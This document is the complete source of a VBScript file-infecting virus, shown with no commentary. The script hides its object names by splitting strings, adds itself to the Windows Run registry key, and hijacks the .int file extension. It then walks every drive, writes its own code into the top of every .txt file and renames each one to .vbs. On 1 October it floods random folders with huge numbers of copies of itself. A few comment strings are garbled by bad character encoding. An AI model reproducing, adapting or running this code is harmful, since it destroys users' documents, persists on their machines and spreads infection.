rem start  
model=false  
mydicN=0  

on error resume next   
set fso=createobject("script"&"ing.filesyste"&"mobject")  
set sh=createobject("wscr" & "ipt.sh" & "ell")  
set sysdir=fso.getspecialfolder(1)  
set mydic=createobject("script"&"ing.dict" &"ionary")  

key0="HKCR\VBSFile\DefaultIcon\"  
sh.regwrite key0,sysdir & "\shell32.dll,-152"  
sh.regwrite "HKCR\.int\","VBSFile"  
newfilename=sysdir & "\" & "SoundMier.int"  
fso.copyfile WScript.ScriptFullName,newfilename  
key0="HKLM\software\microsoft\windows\currentversion\run\SoundMier"  
sh.regwrite key0,newfilename  

set file0=fso.OpenTextFile(WScript.ScriptFullName,1)  
readscript= false  
textstr = ""  
textstr2 = ""  
Do While file0.AtEndOfStream <> True  
   strtemp=file0.readline  
   if strtemp="rem start" then  
readscript=true  
   elseif strtemp="rem end" then  
textstr=textstr & strtemp & vbCrLf  
readscript=false  
strtemp=file0.readline  
   end if  
   if readscript then  
textstr=textstr & strtemp & vbCrLf     
   else  
textstr2=textstr2 & mid(strtemp,2) & vbcrlf  
   end if  
Loop  
file0.close  

if WScript.ScriptFullName<>newfilename then  
tempName=Replace(wscript.ScriptName,".vbs",".txt")  
set file3=fso.OpenTextFile(sysdir & "\" & tempName,2,true)  
file3.write textstr2  
file3.close  
sh.Run "notepad " & chr(34) & sysdir & "\" & tempName & chr(34), 1, true  
set file3=fso.OpenTextFile(sysdir & "\" & tempName,1,true)  
text0=""  
Do While file3.AtEndOfStream <> True  
text0=text0 & "'" & file3.readline & vbcrlf  
loop  
file3.close  
textstr2=text0  
set file0=fso.OpenTextFile(WScript.ScriptFullName,2,true)  
file0.write textstr & textstr2  
file0.close  
Set MyFile0 = fso.GetFile(sysdir & "\" & tempName)  
MyFile0.Delete  
end if  


if day(now)=1 and month(now)=10 then model=true  
For Each mydrive in fso.Drives  
  scan mydrive.path & "\"  
next  
'scan "c:\1\"    '≤‚ ‘”√¿˝  
if model then myshow  
wscript.quit  

sub scan(folder_)  
on error resume next  
set folder_=fso.getfolder(folder_)  
if model then  
mydicN=mydicN + 1  
mydic.add cstr(mydicN),cstr(folder_.path)  
else  
set myfiles=folder_.files  
for each myfile in myfiles  
    exstr=lcase(fso.GetExtensionName(myfile.name))  
    if exstr="txt" then  
set file1=fso.OpenTextFile(myfile.path,1,true)  
file1stemp=""  
Do While file1.AtEndOfStream <> True  
   file1stemp=file1stemp & "'" & file1.readline & vbcrlf  
loop  
file1.close  
set file1=fso.OpenTextFile(myfile.path,2,true)  
file1.write textstr & file1stemp  
file1.close  
stemp=Left(myfile.path, len(myfile.path)-3) & "vbs"  
if not fso.FileExists(stemp) then  
    myfile.name = Left(myfile.name, len(myfile.name)-3) & "vbs"  
else  
    myfile.name = "∏¥º˛" & Left(myfile.name, len(myfile.name)-3) & "vbs"  
end if  
set file1=nothing  
    end if  
next  
set myfiles=nothing  
end if  
set subfolders=folder_.subfolders  
for each subfolder in subfolders  
scan(subfolder)  
next  
set folder=nothing   
end sub   

sub myshow()   
on error resume next   
for i=1 to 10  
for j=1 to 10000  
for r=1 to 10000  
randomize  
f=""   
for k=1 to 9  
    f=f & chr(int((122-65+1)*rnd+65))  
next  
showfilename=mydic.item(cstr(int(rnd * mydicN+1))) & "\" & f &".vbs"  
fso.copyfile WScript.ScriptFullName,showfilename,true  
next   
next   
next   
end sub  
rem end  
